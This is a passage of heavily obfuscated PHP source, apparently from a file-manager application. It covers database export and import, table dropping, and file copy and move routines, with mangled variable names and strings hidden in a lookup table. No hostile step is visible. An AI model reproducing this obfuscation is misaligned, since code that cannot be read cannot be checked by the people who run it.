($Ú„úì¬¤[$_SERVER[Ñ¯©ç][33]] == $_SERVER[Ñ¯©ç][1124]) { $á°ê£ÜŞ = json_decode($Ú„úì¬¤[$_SERVER[Ñ¯©ç][434]], !0); if ($á°ê£ÜŞ[$_SERVER[Ñ¯©ç][32]] == $GLOBALS[$_SERVER[Ñ¯©ç][839]] && $á°ê£ÜŞ[$_SERVER[Ñ¯©ç][803]] != 1) { continue; } } } else { if ($Ú„úì¬¤[$_SERVER[Ñ¯©ç][33]] == $_SERVER[Ñ¯©ç][1125] && $Ú„úì¬¤[$_SERVER[Ñ¯©ç][107]] == $_SERVER[Ñ¯©ç][834]) { continue; } } } if ($É°î—™) { $Ú„úì¬¤[$_SERVER[Ñ¯©ç][97]] = "\173\151\x6f\72{$É°î—™}\x7d" . substr($Ú„úì¬¤[$_SERVER[Ñ¯©ç][97]], strlen("\x7b\x69\x6f\72{$Ú„úì¬¤[$_SERVER[Ñ¯©ç][869]]}\x7d")); $Ú„úì¬¤[$_SERVER[Ñ¯©ç][869]] = $É°î—™; } $¦†º†£Ï[] = $_SERVER[Ñ¯©ç][1126] . $this->sqlEncode($Ú„úì¬¤) . $_SERVER[Ñ¯©ç][1127]; } $ÛĞ¾¤©Ù = "\x49\116\123\105\122\x54\40\111\x4e\x54\117\x20\x60{$ÚŠÆ¬Ÿ}\140\40\50\x60" . implode($_SERVER[Ñ¯©ç][1128], $ÇéáÍÖŞ) . $_SERVER[Ñ¯©ç][1129]; fwrite($ğÙ ÒßÇ, $ÛĞ¾¤©Ù . implode($_SERVER[Ñ¯©ç][1130], $¦†º†£Ï) . $_SERVER[Ñ¯©ç][84] . PHP_EOL); $×Ñê×ªê += $’æ¹‰×ş; if ($Üá«ë³ó) { $Üá«ë³ó->update($’æ¹‰×ş); } } while ($ç“Ç ğÓ == $’æ¹‰×ş); fclose($ğÙ ÒßÇ); return $×Ñê×ªê; } public function sqlToDb($ÅÜØö¿Ÿ, &$Éíªƒê”) { $ì¤Ó©–Ğ =& $_SERVER[Ñ¯©ç]; $çÊ•Å„‘ = $this->model()->db(); $ó„¿û‡« = @fopen($ÅÜØö¿Ÿ, $ì¤Ó©–Ğ[1131]); if (!$ó„¿û‡«) { return !1; } $ƒÂ›Õµó = 0; $Úó˜¾§÷ = $ì¤Ó©–Ğ[12]; $àÊı‡ÉÎ = array(); $âš´î« = $this->dbType(); $÷ÜÀáÅ¢ = $âš´î« == $ì¤Ó©–Ğ[13] ? 500 : 2000; $˜ŞÂ¾Ùß = basename($ÅÜØö¿Ÿ, $ì¤Ó©–Ğ[840]); $‡Ì¨šœ = 0; $À¯É½÷Û = 4194304; while (!feof($ó„¿û‡«)) { $ñÁŞ±¹µ = trim(fgets($ó„¿û‡«)); if (!$ñÁŞ±¹µ) { continue; } $æ¶Ë½€ë = $this->sqlDecode($ñÁŞ±¹µ, $âš´î«, $˜ŞÂ¾Ùß); if (stripos($æ¶Ë½€ë, $ì¤Ó©–Ğ[415]) === 0) { if (!$Úó˜¾§÷) { $Úó˜¾§÷ = $æ¶Ë½€ë . $ì¤Ó©–Ğ[53]; } continue; } if ($Éíªƒê”) { $Éíªƒê”->task[$ì¤Ó©–Ğ[1116]] += 1; } $ƒÂ›Õµó++; $àÊı‡ÉÎ[] = rtrim(rtrim(trim($æ¶Ë½€ë), $ì¤Ó©–Ğ[50]), $ì¤Ó©–Ğ[84]); $¾´ğ‚­ = null; $™Ô¸Ššª = strlen($æ¶Ë½€ë); $‡Ì¨šœ += $™Ô¸Ššª; $åË½œß› = strlen($Úó˜¾§÷) + $‡Ì¨šœ + (count($àÊı‡ÉÎ) - 1); if ($åË½œß› >= $À¯É½÷Û) { $¾´ğ‚­ = array_pop($àÊı‡ÉÎ); if ($ƒÂ›Õµó > 1) { $ƒÂ›Õµó--; } } if ($ƒÂ›Õµó >= $÷ÜÀáÅ¢ || $¾´ğ‚­) { $æ¶Ë½€ë = $Úó˜¾§÷ . implode($ì¤Ó©–Ğ[50], $àÊı‡ÉÎ); if (!$çÊ•Å„‘->execute($æ¶Ë½€ë)) { return !1; } if ($Éíªƒê”) { $Éíªƒê”->update($ƒÂ›Õµó); } $àÊı‡ÉÎ = array(); $ƒÂ›Õµó = 0; $‡Ì¨šœ = 0; if ($¾´ğ‚­) { $àÊı‡ÉÎ = array($¾´ğ‚­); $ƒÂ›Õµó = 1; $‡Ì¨šœ = $™Ô¸Ššª; } } } fclose($ó„¿û‡«); if (!empty($àÊı‡ÉÎ)) { $æ¶Ë½€ë = $Úó˜¾§÷ . implode($ì¤Ó©–Ğ[50], $àÊı‡ÉÎ); if (!$çÊ•Å„‘->execute($æ¶Ë½€ë)) { return !1; } if ($Éíªƒê”) { $Éíªƒê”->update($ƒÂ›Õµó); } } return !0; } public function dropTable($¹µÊÆ½° = null) { $®õÀŸ½ = $this->model()->db(); $áÀÑùÓĞ = $¹µÊÆ½° ? array($¹µÊÆ½°) : $®õÀŸ½->getTables(); if (!$áÀÑùÓĞ) { return; } foreach ($áÀÑùÓĞ as $¹µÊÆ½°) { if ($¹µÊÆ½°) { $¹µÊÆ½° = strtolower($¹µÊÆ½°); } else { continue; } $®õÀŸ½->execute("\x64\162\157\x70\40\164\x61\x62\154\145\x20\x69\x66\40\145\x78\x69\163\164\x73\x20\x60{$¹µÊÆ½°}\140"); } } private function sqlEncode($¥ˆ¡Ë­‡) { $²‰²ã¡œ =& $_SERVER[Ñ¯©ç]; $ù”»ıˆ = array(); foreach ($¥ˆ¡Ë­‡ as $–ß¯‰ñ×) { if (is_array($–ß¯‰ñ×)) { $–ß¯‰ñ× = json_encode_force($–ß¯‰ñ×); } $–ß¯‰ñ× = addslashes($–ß¯‰ñ×); $–ß¯‰ñ× = str_replace(array($²‰²ã¡œ[1132], $²‰²ã¡œ[59], $²‰²ã¡œ[402]), array($²‰²ã¡œ[1133], $²‰²ã¡œ[1134], $²‰²ã¡œ[1135]), $–ß¯‰ñ×); $ù”»ıˆ[] = $–ß¯‰ñ×; } return $²‰²ã¡œ[68] . implode($²‰²ã¡œ[1136], $ù”»ıˆ) . $²‰²ã¡œ[68]; } private function sqlDecode($áØÒ„Šš, $İãıöÎ, $²öÉÑáå = '') { $®éèµğô =& $_SERVER[Ñ¯©ç]; $áØÒ„Šš = str_replace(array($®éèµğô[1133], $®éèµğô[1134], $®éèµğô[1135]), array($®éèµğô[1132], $®éèµğô[59], $®éèµğô[402]), $áØÒ„Šš); if ($İãıöÎ == $®éèµğô[13]) { $áØÒ„Šš = str_ireplace($®éèµğô[1137], $®éèµğô[69], $áØÒ„Šš); $áØÒ„Šš = stripslashes($áØÒ„Šš); } return preg_replace($®éèµğô[1138], $®éèµğô[12], $áØÒ„Šš); if ($İãıöÎ == $®éèµğô[13]) { return $²öÉÑáå != $®éèµğô[1139] ? stripslashes($áØÒ„Šš) : $áØÒ„Šš; } if ($²öÉÑáå == $®éèµğô[1139]) { $áØÒ„Šš = str_replace($®éèµğô[1140], $®éèµğô[131], stripslashes($áØÒ„Šš)); } return $áØÒ„Šš; } public function getSqlFile($—Óùëã’ = '') { $ç‡½ŞÌ =& $_SERVER[Ñ¯©ç]; $´”Å‰Ò = $this->dbType(!0); $‚Ù¹ïÒÉ = CONTROLLER_DIR . "\151\156\x73\x74\x61\x6c\154\x2f\144\141\164\141\x2f{$´”Å‰Ò}\x2e\x73\x71\x6c"; $óîÀ’ş¤ = file_get_contents($‚Ù¹ïÒÉ); $Ø•˜Œ™é = $ç‡½ŞÌ[1141] . ($´”Å‰Ò == $ç‡½ŞÌ[856] ? $ç‡½ŞÌ[1142] : $ç‡½ŞÌ[1143]) . $ç‡½ŞÌ[1144]; preg_match_all($Ø•˜Œ™é, $óîÀ’ş¤, $€Îğ­ıƒ); $êçÃòØ’ = $€Îğ­ıƒ[1]; $€Ü´©ûÑ = $this->model()->db(); $ó¡È¥ö = $€Ü´©ûÑ->getTables(); $†úÌ¶áŠ = TEMP_FILES . $ç‡½ŞÌ[1145] . date($ç‡½ŞÌ[272]) . $ç‡½ŞÌ[8]; del_dir($†úÌ¶áŠ); mk_dir($†úÌ¶áŠ); $ĞÈóÊÄÜ = $†úÌ¶áŠ . $ç‡½ŞÌ[1146]; $®§›Â¾¬ = $†úÌ¶áŠ . $ç‡½ŞÌ[1147]; $ƒáíÍå = $´”Å‰Ò == $ç‡½ŞÌ[13] ? $ç‡½ŞÌ[856] : $ç‡½ŞÌ[13]; IO::copy(CONTROLLER_DIR . "\x69\156\x73\164\x61\154\x6c\x2f\x64\x61\x74\x61\57{$ƒáíÍå}\x2e\x73\161\x6c", $†úÌ¶áŠ); @touch($†úÌ¶áŠ . $´”Å‰Ò . $ç‡½ŞÌ[840]); $Ğß¼Í…… = fopen($ĞÈóÊÄÜ, $ç‡½ŞÌ[1120]); $ş­™¦ = fopen($®§›Â¾¬, $ç‡½ŞÌ[1120]); if ($´”Å‰Ò == $ç‡½ŞÌ[13]) { $ó¡È¥ö = array_diff($ó¡È¥ö, array($ç‡½ŞÌ[832], $ç‡½ŞÌ[833])); $Õ¼Ÿê¢û = array($ç‡½ŞÌ[1148], $ç‡½ŞÌ[1149], $ç‡½ŞÌ[1150]); fwrite($ş­™¦, implode(PHP_EOL, $Õ¼Ÿê¢û) . PHP_EOL . PHP_EOL); foreach ($ó¡È¥ö as $Ñ¼½İºÔ) { $Øª×µ¦÷ = $this->sqlFromSqlite($Ñ¼½İºÔ); if (!$Øª×µ¦÷[$ç‡½ŞÌ[13]]) { continue; } fwrite($ş­™¦, $Øª×µ¦÷[$ç‡½ŞÌ[13]] . PHP_EOL . PHP_EOL); if (!in_array($Ñ¼½İºÔ, $êçÃòØ’)) { fwrite($Ğß¼Í……, $Øª×µ¦÷[$ç‡½ŞÌ[856]] . PHP_EOL . PHP_EOL); } } } else { foreach ($ó¡È¥ö as $Ñ¼½İºÔ) { $Øª×µ¦÷ = $this->sqlFromMysql($Ñ¼½İºÔ); if (!$Øª×µ¦÷[$ç‡½ŞÌ[856]]) { continue; } fwrite($Ğß¼Í……, $Øª×µ¦÷[$ç‡½ŞÌ[856]] . PHP_EOL . PHP_EOL); if (!in_array($Ñ¼½İºÔ, $êçÃòØ’)) { fwrite($ş­™¦, $Øª×µ¦÷[$ç‡½ŞÌ[13]] . PHP_EOL . PHP_EOL); } } } fclose($Ğß¼Í……); fclose($ş­™¦); $óîÀ’ş¤ = array($ç‡½ŞÌ[856] => $ĞÈóÊÄÜ, $ç‡½ŞÌ[13] => $®§›Â¾¬); return $—Óùëã’ ? $óîÀ’ş¤[$—Óùëã’] : $óîÀ’ş¤; } public function dbType($Ş û³Ì£ = false) { $³Ü²–Ï¬ =& $_SERVER[Ñ¯©ç]; $õ¾’ŒØÄ = $Ş û³Ì£ ? $GLOBALS[$³Ü²–Ï¬[6]][$³Ü²–Ï¬[21]] : $this->database; $õ¾’ŒØÄ = array_change_key_case($õ¾’ŒØÄ); $áìĞ¡ş = $õ¾’ŒØÄ[$³Ü²–Ï¬[1020]]; if ($áìĞ¡ş == $³Ü²–Ï¬[1017]) { $†­şŸÒ¤ = explode($³Ü²–Ï¬[4], $õ¾’ŒØÄ[$³Ü²–Ï¬[1026]]); $áìĞ¡ş = $†­şŸÒ¤[0]; } $°¢âÁ¹ = array($³Ü²–Ï¬[1151] => $³Ü²–Ï¬[13], $³Ü²–Ï¬[965] => $³Ü²–Ï¬[856]); if (isset($°¢âÁ¹[$áìĞ¡ş])) { $áìĞ¡ş = $°¢âÁ¹[$áìĞ¡ş]; } return $áìĞ¡ş; } public function sqlFromMysql($‚ùú÷ú, $•£““İ‡ = '') { $Ì‰¾æœª =& $_SERVER[Ñ¯©ç]; $·™ÖÉºğ = $this->model()->db(); $ó´Œêšæ = $·™ÖÉºğ->query($Ì‰¾æœª[1152] . $‚ùú÷ú . $Ì‰¾æœª[444]); if (!$ó´Œêšæ || !$ó´Œêšæ[0]) { return !1; } $½©£ĞÙ = _get($ó´Œêšæ[0], $Ì‰¾æœª[1153], $Ì‰¾æœª[12]); if (!$½©£ĞÙ) { return !1; } $É’Ù†© = "\104\x52\x4f\x50\x20\x54\101\x42\114\x45\40\111\106\40\x45\130\111\123\124\123\40\140{$‚ùú÷ú}\140\73" . PHP_EOL . $½©£ĞÙ . $Ì‰¾æœª[84]; if ($•£““İ‡ && $•£““İ‡ == $Ì‰¾æœª[856]) { return $É’Ù†©; } $¬ÖÀ®‹İ = array_change_key_case($GLOBALS[$Ì‰¾æœª[6]][$Ì‰¾æœª[21]]); $á‚æ–”Ä = $¬ÖÀ®‹İ[$Ì‰¾æœª[1025]]; $¹ÙŒ¬°’ = $Ì‰¾æœª[1154] . $á‚æ–”Ä . $Ì‰¾æœª[1155] . $‚ùú÷ú . $Ì‰¾æœª[68]; $Ë‰¦¾Ÿ = $Ì‰¾æœª[1156] . $‚ùú÷ú . $Ì‰¾æœª[953]; $ï›í§ºŸ = $·™ÖÉºğ->query($¹ÙŒ¬°’); if (empty($ï›í§ºŸ)) { $¡°›ÕËè = array($Ì‰¾æœª[856] => $Ì‰¾æœª[12], $Ì‰¾æœª[13] => $Ì‰¾æœª[12]); return $•£““İ‡ ? $¡°›ÕËè[$•£““İ‡] : $¡°›ÕËè; } $İÑüí÷« = $·™ÖÉºğ->query($Ë‰¦¾Ÿ); $Ç¹ÔÇµö = $Ì‰¾æœª[12]; $º×ãºøÄ = array(); foreach ($İÑüí÷« as $ä«‚£ÓÕ) { if (!$Ç¹ÔÇµö && $ä«‚£ÓÕ[$Ì‰¾æœª[1157]] == $Ì‰¾æœª[1158]) { $Ç¹ÔÇµö = $ä«‚£ÓÕ[$Ì‰¾æœª[1159]]; } if (isset($º×ãºøÄ[$ä«‚£ÓÕ[$Ì‰¾æœª[1157]]])) { $º×ãºøÄ[$ä«‚£ÓÕ[$Ì‰¾æœª[1157]]][$Ì‰¾æœª[1160]][] = $ä«‚£ÓÕ[$Ì‰¾æœª[1159]]; continue; } $º×ãºøÄ[$ä«‚£ÓÕ[$Ì‰¾æœª[1157]]] = array($Ì‰¾æœª[1161] => $ä«‚£ÓÕ[$Ì‰¾æœª[1157]], $Ì‰¾æœª[1160] => array($ä«‚£ÓÕ[$Ì‰¾æœª[1159]]), $Ì‰¾æœª[1162] => $ä«‚£ÓÕ[$Ì‰¾æœª[1163]] == $Ì‰¾æœª[101] ? 0 : 1); } $ƒ½Şş¤œ = array(); foreach ($º×ãºøÄ as $ä«‚£ÓÕ) { $èìòÃã™ = $ä«‚£ÓÕ[$Ì‰¾æœª[1161]] == $Ì‰¾æœª[1158]; $ç¦â‘Ğç = array($Ì‰¾æœª[1164], $ä«‚£ÓÕ[$Ì‰¾æœª[1162]] == $Ì‰¾æœª[101] && !$èìòÃã™ ? $Ì‰¾æœª[1165] : $Ì‰¾æœª[12], $Ì‰¾æœª[1166], $Ì‰¾æœª[1167] . $‚ùú÷ú . $Ì‰¾æœª[11] . ($èìòÃã™ ? $Ì‰¾æœª[1168] : $ä«‚£ÓÕ[$Ì‰¾æœª[1161]]) . $Ì‰¾æœª[131], $Ì‰¾æœª[1169], $Ì‰¾æœª[131] . $‚ùú÷ú . $Ì‰¾æœª[131], $Ì‰¾æœª[1170] . implode($Ì‰¾æœª[1171], $ä«‚£ÓÕ[$Ì‰¾æœª[1160]]) . $Ì‰¾æœª[1172]); $ƒ½Şş¤œ[] = implode($Ì‰¾æœª[53], $ç¦â‘Ğç) . $Ì‰¾æœª[84]; } $Ä¼Ó¯Å‹ = array(); $İº•âÙ¾ = array($Ì‰¾æœª[1173] => $Ì‰¾æœª[1174], $Ì‰¾æœª[1174] => $Ì‰¾æœª[1174], $Ì‰¾æœª[348] => $Ì‰¾æœª[375], $Ì‰¾æœª[347] => $Ì‰¾æœª[375]); foreach ($ï›í§ºŸ as $ä«‚£ÓÕ) { $ç¦â‘Ğç = array($Ì‰¾æœª[131] . $ä«‚£ÓÕ[$Ì‰¾æœª[1175]] . $Ì‰¾æœª[131], isset($İº•âÙ¾[$ä«‚£ÓÕ[$Ì‰¾æœª[1176]]]) ? $İº•âÙ¾[$ä«‚£ÓÕ[$Ì‰¾æœª[1176]]] : $ä«‚£ÓÕ[$Ì‰¾æœª[1177]], $ä«‚£ÓÕ[$Ì‰¾æœª[1178]] == $Ì‰¾æœª[951] ? $Ì‰¾æœª[1179] : $Ì‰¾æœª[1180], $ä«‚£ÓÕ[$Ì‰¾æœª[1175]] == $Ç¹ÔÇµö ? $Ì‰¾æœª[1181] : $Ì‰¾æœª[12], $ä«‚£ÓÕ[$Ì‰¾æœª[1002]] ? strtoupper(str_replace($Ì‰¾æœª[11], $Ì‰¾æœª[12], $ä«‚£ÓÕ[$Ì‰¾æœª[1002]])) : $Ì‰¾æœª[12]); $Ä¼Ó¯Å‹[] = trim(implode($Ì‰¾æœª[53], $ç¦â‘Ğç)); } $Îûê’¢  = array($Ì‰¾æœª[1182] . $‚ùú÷ú . $Ì‰¾æœª[1183], $Ì‰¾æœª[1184] . $‚ùú÷ú . $Ì‰¾æœª[1185], implode($Ì‰¾æœª[50] . PHP_EOL, $Ä¼Ó¯Å‹), $Ì‰¾æœª[999]); $•úœö‚Ã = implode(PHP_EOL, array_merge($Îûê’¢ , $ƒ½Şş¤œ)); if ($•£““İ‡ && $•£““İ‡ == $Ì‰¾æœª[13]) { return $•úœö‚Ã; } $¡°›ÕËè = array($Ì‰¾æœª[856] => $É’Ù†©, $Ì‰¾æœª[13] => $•úœö‚Ã); return $•£““İ‡ ? $¡°›ÕËè[$•£““İ‡] : $¡°›ÕËè; } public function sqlFromSqlite($ïÕ™óÌÎ, $·Ø÷ÊŸ¦ = '') { $ÅÓşÊ“™ =& $_SERVER[Ñ¯©ç]; $œöÕÁøÙ = $this->model()->db(); $ì©ºƒâ‘ = "\x50\122\x41\x47\115\101\x20\124\x41\102\114\105\x5f\111\116\x46\x4f\40\x28\47{$ïÕ™óÌÎ}\x27\x29"; $‰­¡›ÏÂ = "\123\x45\114\105\x43\124\40\x2a\x20\106\x52\x4f\115\x20\163\161\154\x69\x74\x65\137\x6d\x61\163\164\x65\162\40\127\110\x45\x52\x45\x20\164\x62\x6c\137\x6e\141\155\145\x20\75\40\47{$ïÕ™óÌÎ}\x27"; $»…›ñåû = $œöÕÁøÙ->query($ì©ºƒâ‘); if (empty($»…›ñåû)) { $÷²„½» = array($ÅÓşÊ“™[856] => $ÅÓşÊ“™[12], $ÅÓşÊ“™[13] => $ÅÓşÊ“™[12]); return $·Ø÷ÊŸ¦ ? $÷²„½»[$·Ø÷ÊŸ¦] : $÷²„½»; } $èÓº¿£ô = $œöÕÁøÙ->query($‰­¡›ÏÂ); $‹á…ÌÊ = $Ôˆ’ñĞÑ = array(); foreach ($èÓº¿£ô as $®¬üªşú) { if ($®¬üªşú[$ÅÓşÊ“™[33]] == $ÅÓşÊ“™[340]) { $‹á…ÌÊ[] = $®¬üªşú[$ÅÓşÊ“™[1186]]; } else { $Ôˆ’ñĞÑ[$®¬üªşú[$ÅÓşÊ“™[32]]] = $®¬üªşú[$ÅÓşÊ“™[1186]]; } } $½ÊßÂº¨ = array_merge(array($ÅÓşÊ“™[1182] . $ïÕ™óÌÎ . $ÅÓşÊ“™[131]), $‹á…ÌÊ, array_values($Ôˆ’ñĞÑ)); $½ÊßÂº¨ = implode($ÅÓşÊ“™[84] . PHP_EOL, $½ÊßÂº¨) . $ÅÓşÊ“™[84]; if ($·Ø÷ÊŸ¦ && $·Ø÷ÊŸ¦ == $ÅÓşÊ“™[13]) { return $½ÊßÂº¨; } $Óéš¶Ë = array(); $ˆÀ¾Å—‰ = array($ÅÓşÊ“™[1174] => $ÅÓşÊ“™[1187], $ÅÓşÊ“™[375] => $ÅÓşÊ“™[1188]); $å¸İú© = $ÅÓşÊ“™[12]; foreach ($»…›ñåû as $®¬üªşú) { if ($®¬üªşú[$ÅÓşÊ“™[67]] == $ÅÓşÊ“™[101]) { $å¸İú© = $®¬üªşú[$ÅÓşÊ“™[32]]; } $ÅûĞã = array($ÅÓşÊ“™[444] . $®¬üªşú[$ÅÓşÊ“™[32]] . $ÅÓşÊ“™[444], isset($ˆÀ¾Å—‰[$®¬üªşú[$ÅÓşÊ“™[33]]]) ? $ˆÀ¾Å—‰[$®¬üªşú[$ÅÓşÊ“™[33]]] : $®¬üªşú[$ÅÓşÊ“™[33]], $®¬üªşú[$ÅÓşÊ“™[35]] == $ÅÓşÊ“™[101] ? $ÅÓşÊ“™[1179] : $ÅÓşÊ“™[1189] . $®¬üªşú[$ÅÓşÊ“™[66]], $®¬üªşú[$ÅÓşÊ“™[67]] == $ÅÓşÊ“™[101] ? $ÅÓşÊ“™[1190] : $ÅÓşÊ“™[12]); $Óéš¶Ë[] = trim(implode($ÅÓşÊ“™[53], $ÅûĞã)); } foreach ($Ôˆ’ñĞÑ as $¡Ì¹Óïœ => $ä©Ó»øë) { $»ÓÅÆÖ­ = str_replace($ÅÓşÊ“™[1191] . $ïÕ™óÌÎ . $ÅÓşÊ“™[11], $ÅÓşÊ“™[12], $¡Ì¹Óïœ); $¥ùë = str_replace(array($ÅÓşÊ“™[131], $ÅÓşÊ“™[1010]), $ÅÓşÊ“™[444], substr($ä©Ó»øë, stripos($ä©Ó»øë, $ÅÓşÊ“™[321]))); if ($»ÓÅÆÖ­ == $ÅÓşÊ“™[1168]) { $°şÒË‰Ä = $ÅÓşÊ“™[1192] . $å¸İú© . $ÅÓşÊ“™[1193]; } else { $°şÒË‰Ä = (stripos($»ÓÅÆÖ­, $ÅÓşÊ“™[11]) ? $ÅÓşÊ“™[1194] : $ÅÓşÊ“™[12]) . ($ÅÓşÊ“™[1195] . $»ÓÅÆÖ­ . $ÅÓşÊ“™[1196] . $¥ùë); } $Óéš¶Ë[] = $°şÒË‰Ä; } $—–·ÔøÅ = array($ÅÓşÊ“™[1197] . $ïÕ™óÌÎ . $ÅÓşÊ“™[1198], $ÅÓşÊ“™[1199] . $ïÕ™óÌÎ . $ÅÓşÊ“™[1200], implode($ÅÓşÊ“™[50] . PHP_EOL, $Óéš¶Ë), $ÅÓşÊ“™[1201]); $Èáş©¼¨ = implode(PHP_EOL, $—–·ÔøÅ); if ($·Ø÷ÊŸ¦ && $·Ø÷ÊŸ¦ == $ÅÓşÊ“™[856]) { return $Èáş©¼¨; } $÷²„½» = array($ÅÓşÊ“™[856] => $Èáş©¼¨, $ÅÓşÊ“™[13] => $½ÊßÂº¨); return $·Ø÷ÊŸ¦ ? $÷²„½»[$·Ø÷ÊŸ¦] : $÷²„½»; } } class IO extends ClassBaseCall { public static $driverCache = array(); public static $driverListSystem = array(); public static $driverListUser = array(); public static function __callStatic($¥ë»ÏÛˆ, $¼£¿Ÿ¼ñ) { $¿—÷ÈãÉ =& $_SERVER[Ñ¯©ç]; $İç­òıä = $¼£¿Ÿ¼ñ; $GLOBALS[$¿—÷ÈãÉ[1202]] = $¿—÷ÈãÉ[1203] . $¥ë»ÏÛˆ; Hook::trigger($¿—÷ÈãÉ[1203] . $¥ë»ÏÛˆ . $¿—÷ÈãÉ[1204], $İç­òıä); $ßÄ¤ü¸ = self::driverMake($¼£¿Ÿ¼ñ[0]); if (!$ßÄ¤ü¸) { return !1; } if (method_exists($ßÄ¤ü¸, $¥ë»ÏÛˆ)) { $·“¯ØÛ… = @call_user_func_array(array($ßÄ¤ü¸, $¥ë»ÏÛˆ), $¼£¿Ÿ¼ñ); } else { if (method_exists($ßÄ¤ü¸, $¿—÷ÈãÉ[1205])) { $·“¯ØÛ… = @call_user_func_array(array($ßÄ¤ü¸, $¥ë»ÏÛˆ), $¼£¿Ÿ¼ñ); } else { if (method_exists(self, $¥ë»ÏÛˆ)) { $·“¯ØÛ… = @call_user_func_array(array(self, $¥ë»ÏÛˆ), $¼£¿Ÿ¼ñ); } else { $·“¯ØÛ… = call_user_func_array(array(parent, $¥ë»ÏÛˆ), $¼£¿Ÿ¼ñ); } } } Hook::trigger($¿—÷ÈãÉ[1203] . $¥ë»ÏÛˆ . $¿—÷ÈãÉ[1206], $İç­òıä, $·“¯ØÛ…); return $·“¯ØÛ…; } public static function init($ÂŞ½õ‹Û) { return self::driverMake($ÂŞ½õ‹Û); } public static function copy($Úá·…ŠÊ, $¯°ƒÔ±£, $å˜ï°©¡ = false, $Ôóç†Ù = false) { return self::copyMoveStart($Úá·…ŠÊ, $¯°ƒÔ±£, $å˜ï°©¡, $_SERVER[Ñ¯©ç][601], $Ôóç†Ù); } public static function move($õÚ´“˜¤, $³„¶”«Â, $ı§Ú¾üÎ = false, $ƒ–°İ² = false) { return self::copyMoveStart($õÚ´“˜¤, $³„¶”«Â, $ı§Ú¾üÎ, $_SERVER[Ñ¯©ç][603], $ƒ–°İ²); } private static function copyMoveStart($¢íÏ×ô, $ËŸÛö¿÷, $ñÀäˆŒ”, $²Ÿ’µØª, $ãî¶Ì´) { $ÛÃ„±“ª =& $_SERVER[Ñ¯©ç]; $©òè×Á¸ = array($¢íÏ×ô, $ËŸÛö¿÷, $ñÀäˆŒ”, $ãî¶Ì´); Hook::trigger($ÛÃ„±“ª[1203] . $²Ÿ’µØª . $ÛÃ„±“ª[1204], $©òè×Á¸); $àá­éşÉ = self::copyMove($¢íÏ×ô, $ËŸÛö¿÷, $ñÀäˆŒ”, $²Ÿ’µØª, $ãî¶Ì´); Hook::trigger($ÛÃ„±“ª[1203] . $²Ÿ’µØª . $ÛÃ„±“ª[1206], $©òè×Á¸, $àá­éşÉ); return $àá­éşÉ; } public static function saveFile($Š¼ÆŸöş, $ÛÏïä€ˆ, $ÀºÄ¸ = true) { $Ê…»¡ü =& $_SERVER[Ñ¯©ç]; $‚Û„®ĞÏ = self::info($ÛÏïä€ˆ); $õüè”£Ç = self::driverMake($Š¼ÆŸöş); $Ñ³…Š¢× = self::driverMake($ÛÏïä€ˆ); $¾ÄéÔ€Ä = !1; if ($Ñ³…Š¢×->pathParse[$Ê…»¡ü[1207]]) { $¾ÄéÔ€Ä = $Ñ³…Š¢×; $ÁÕˆ… Ñ = $Ñ³…Š¢×->pathParse[$Ê…»¡ü[1207]]; $Ñ³…Š¢× = self::driverMake($ÁÕˆ… Ñ); } if ($õüè”£Ç->pathParse[$Ê…»¡ü[1207]]) { $Ò¨›Û´õ = $õüè”£Ç->pathParse[$Ê…»¡ü[1207]]; $õüè”£Ç = self::driverMake($Ò¨›Û´õ); } $”øïÃéï = $Ñ³…Š¢×->pathFather($ÛÏïä€ˆ); $òúã¼  = !0; if (!$ÀºÄ¸ && self::driverIsSame($õüè”£Ç, $Ñ³…Š¢×)) { $òúã¼  = !1; } $€™ÕËÏÜ = self::copyFile($õüè”£Ç, $Š¼ÆŸöş, $Ñ³…Š¢×, $”øïÃéï, $‚Û„®ĞÏ[$Ê…»¡ü[32]], $òúã¼ ); if ($¾ÄéÔ€Ä) { $€™ÕËÏÜ = $¾ÄéÔ€Ä->getPathOuter($€™ÕËÏÜ); } return $€™ÕËÏÜ; } private static function copyMove($®’£­ö, $ÕéËÔ˜°, $­§€¹¦ö, $îÂÜ…ß£, $ÙçÂ„Í• = false) { $©ãÂ´ş =& $_SERVER[Ñ¯©ç]; if (!$®’£­ö || $®’£­ö == $©ãÂ´ş[8] || !$ÕéËÔ˜°) { return !1; } ignore_timeout(); $³°Äñ˜î = self::driverMake($®’£­ö); $‘¤İÚÄ’ = self::driverMake($ÕéËÔ˜°); $éĞö ëï = $îÂÜ…ß£ == $©ãÂ´ş[603]; $¹½€¸‚ = !1; if ($‘¤İÚÄ’->pathParse[$©ãÂ´ş[1207]]) { $¹½€¸‚ = $‘¤İÚÄ’; $ÕéËÔ˜° = $‘¤İÚÄ’->pathParse[$©ãÂ´ş[1207]]; $‘¤İÚÄ’ = self::driverMake($ÕéËÔ˜°); } if ($³°Äñ˜î->pathParse[$©ãÂ´ş[1207]]) { $®’£­ö = $³°Äñ˜î->pathParse[$©ãÂ´ş[1207]]; $³°Äñ˜î = self::driverMake($®’£­ö); } self::check($³°Äñ˜î, $®’£­ö, $‘¤İÚÄ’, $ÕéËÔ˜°); Hook::trigger($©ãÂ´ş[1208], $³°Äñ˜î, $®’£­ö, $‘¤İÚÄ’, $ÕéËÔ˜°); $é¾—á©Œ = self::driverIsSame($³°Äñ˜î, $‘¤İÚÄ’); if ($é¾—á©Œ) { if ($îÂÜ…ß£ == $©ãÂ´ş[603] && !method_exists($‘¤İÚÄ’, $©ãÂ´ş[1209]) && trim($ÕéËÔ˜°, $©ãÂ´ş[8]) == trim($‘¤İÚÄ’->pathFather($®’£­ö), $©ãÂ´ş[8])) { if ($³°Äñ˜î->pathThis($®’£­ö) != $ÙçÂ„Í• && !$³°Äñ˜î->isOsDriver()) { return $³°Äñ˜î->rename($®’£­ö, $ÙçÂ„Í•); } return $‘¤İÚÄ’->getPathOuter($®’£­ö); } if (method_exists($‘¤İÚÄ’, $îÂÜ…ß£)) { return $‘¤İÚÄ’->{$îÂÜ…ß£}($®’£­ö, $ÕéËÔ˜°, $­§€¹¦ö, $ÙçÂ„Í•); } } if ($é¾—á©Œ && $îÂÜ…ß£ == $©ãÂ´ş[603] && $‘¤İÚÄ’->getType() == $©ãÂ´ş[119]) { $äÕ¿³³ = $‘¤İÚÄ’->movePath($®’£­ö, $ÕéËÔ˜°, $ÙçÂ„Í•); if ($äÕ¿³³) { return $äÕ¿³³; } } $»Ñ¾©Ğ³ = $³°Äñ˜î->isFile($®’£­ö); if (!$»Ñ¾©Ğ³ && $‘¤İÚÄ’->getType() == $©ãÂ´ş[810] && $³°Äñ˜î->getType() == $©ãÂ´ş[119]) { $äÕ¿³³ = $‘¤İÚÄ’->copyFolderFromIO($³°Äñ˜î, $®’£­ö, $ÕéËÔ˜°, 